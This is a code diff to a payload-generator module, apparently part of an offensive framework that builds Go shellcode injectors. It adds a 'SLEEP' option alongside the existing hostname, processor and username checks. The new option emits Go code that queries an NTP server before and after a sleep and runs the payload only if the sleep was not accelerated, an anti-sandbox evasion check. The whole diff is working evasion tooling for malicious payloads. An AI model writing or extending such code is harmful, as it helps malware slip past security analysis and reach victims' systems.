@@ -40,7 +40,8 @@ class PayloadModule:
             "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
             "HOSTNAME"       : ["X", "Optional: Required system hostname"],
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
-            "USERNAME"       : ["X", "Optional: The required user account"]
+            "USERNAME"       : ["X", "Optional: The required user account"],
+            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
         }
 
     def system_checks(self):
@@ -71,6 +72,19 @@ class PayloadModule:
         if self.required_options["PROCESSORS"][0].lower() != "x":
             check_code += rand_processor + " := runtime.NumCPU()\n"
             check_code += "if " + rand_processor + " >= " + self.required_options["PROCESSORS"][0] + " {\n"
+            num_ends += 1
+
+        if self.required_options["SLEEP"][0].lower() != "x":
+            check_code += 'type ntp_struct struct {FirstByte,A,B,C uint8;D,E,F uint32;G,H uint64;ReceiveTime uint64;J uint64}\n'
+            check_code += 'sock,_ := net.Dial("udp", "us.pool.ntp.org:123");sock.SetDeadline(time.Now().Add((6*time.Second)));defer sock.Close()\n'
+            check_code += 'ntp_transmit := new(ntp_struct);ntp_transmit.FirstByte=0x1b\n'
+            check_code += 'binary.Write(sock, binary.BigEndian, ntp_transmit);binary.Read(sock, binary.BigEndian, ntp_transmit)\n'
+            check_code += 'val := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((ntp_transmit.ReceiveTime >> 32)*1000000000)))\n'
+            check_code += 'time.Sleep(time.Duration(' + self.required_options["SLEEP"][0] + '*1000) * time.Millisecond)\n'
+            check_code += 'newsock,_ := net.Dial("udp", "us.pool.ntp.org:123");newsock.SetDeadline(time.Now().Add((6*time.Second)));defer newsock.Close()\n'
+            check_code += 'second_transmit := new(ntp_struct);second_transmit.FirstByte=0x1b\n'
+            check_code += 'binary.Write(newsock, binary.BigEndian, second_transmit);binary.Read(newsock, binary.BigEndian, second_transmit)\n'
+            check_code += 'if int(time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((second_transmit.ReceiveTime >> 32)*1000000000))).Sub(val).Seconds()) >= ' + self.required_options["SLEEP"][0] + ' {'
             num_ends += 1
 
         return check_code, num_ends
